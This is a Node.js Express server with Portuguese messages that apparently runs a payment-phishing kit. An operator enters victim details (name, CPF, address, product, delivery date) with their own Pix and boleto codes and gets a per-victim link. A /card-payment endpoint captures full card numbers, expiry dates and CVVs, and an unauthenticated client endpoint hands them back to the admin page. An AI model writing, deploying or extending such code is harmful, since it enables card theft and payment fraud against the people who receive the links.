const express = require('express');
const { v4: uuidv4 } = require('uuid');
const app = express();
const port = 3000;
const path = require('path');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());

let clients = [];
const clientsFile = 'clients.json';

// Carregar clientes do arquivo ao iniciar
try {
  if (fs.existsSync(clientsFile)) {
    const data = fs.readFileSync(clientsFile);
    clients = JSON.parse(data);
    console.log('Clientes carregados do arquivo:', clients);
  }
} catch (error) {
  console.error('Erro ao carregar clientes do arquivo:', error);
  clients = [
    {
      id: '1',
      name: 'benan fei',
      cpf: '0099900022',
      address: 'rua do centro axter Entrega no endereco',
      deliveryDate: '2025-12-12',
      paymentMethod: 'boleto',
      total: '98,80',
      productName: 'Parafusadeira E Fureadeira Impacto The Black Tools Td-21wp 21V 3.8V',
      productPhoto: '',
      qrCode: '',
      pixCode: '',
      boletoLine: '83640000001234567890123456789012345678901234567890'
    }
  ];
}

let cardData = {};

// Salvar clientes no arquivo após cada modificação
function saveClients() {
  fs.writeFileSync(clientsFile, JSON.stringify(clients, null, 2));
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/clients', (req, res) => {
  console.log('Clientes atuais:', clients);
  res.json(clients);
});

app.get('/client/:id', (req, res) => {
  console.log(`GET /client/${req.params.id} chamado, clientes disponíveis:`, clients);
  const client = clients.find(c => c.id === req.params.id);
  if (client) {
    const clientWithCard = { ...client, card: cardData[client.id] || null };
    res.json(clientWithCard);
  } else {
    res.status(404).json({ error: 'Cliente não encontrado' });
  }
});

app.post('/card-payment', (req, res) => {
  const { clientId, cardNumber, cardHolder, expiryDate, cvv } = req.body;
  if (!clientId || !cardNumber || !cardHolder || !expiryDate || !cvv) {
    return res.status(400).json({ error: 'Todos os campos do cartão são obrigatórios' });
  }
  cardData[clientId] = { cardNumber, cardHolder, expiryDate, cvv };
  res.json({ success: true, message: 'Pagamento com cartão registrado com sucesso', clientId });
});

app.post('/client', upload.fields([
  { name: 'productPhoto', maxCount: 1 },
  { name: 'qrCode', maxCount: 1 }
]), (req, res) => {
  console.log('POST /client chamado, body:', req.body, 'files:', req.files);
  const { name, cpf, address, deliveryDate, paymentMethod, total, productName, pixCode, boletoLine } = req.body;
  console.log('Delivery Date recebido:', deliveryDate);
  const productPhoto = req.files['productPhoto'] ? req.files['productPhoto'][0].buffer.toString('base64') : '';
  const qrCode = req.files['qrCode'] ? req.files['qrCode'][0].buffer.toString('base64') : '';

  if (!name || !cpf || !address || !deliveryDate || !paymentMethod || !total || !productName || !productPhoto) {
    return res.status(400).json({ error: 'Todos os campos obrigatórios, incluindo a foto do produto, devem ser preenchidos' });
  }

  const clientData = {
    id: uuidv4(),
    name,
    cpf,
    address,
    deliveryDate,
    paymentMethod,
    total,
    productName: productName || 'Parafusadeira E Fureadeira Impacto The Black Tools Tb-21wp 21V 3.8V',
    productPhoto,
    qrCode,
    pixCode: pixCode || '',
    boletoLine: paymentMethod === 'boleto' ? (boletoLine || '83640000001234567890123456789012345678901234567890') : ''
  };

  clients.push(clientData);
  saveClients();
  console.log('Cliente salvo:', clientData);
  res.json({ success: true, clientId: clientData.id, link: `http://localhost:3000/index.html?id=${clientData.id}` });
});

app.delete('/client/:id', (req, res) => {
  console.log(`DELETE /client/${req.params.id} chamado`);
  const clientIndex = clients.findIndex(c => c.id === req.params.id);
  if (clientIndex !== -1) {
    clients.splice(clientIndex, 1);
    saveClients();
    res.json({ success: true, message: 'Cliente apagado com sucesso' });
  } else {
    res.status(404).json({ error: 'Cliente não encontrado' });
  }
});

app.delete('/clients', (req, res) => {
  console.log('DELETE /clients chamado');
  clients = [];
  saveClients();
  res.json({ success: true, message: 'Todos os clientes apagados com sucesso' });
});

app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});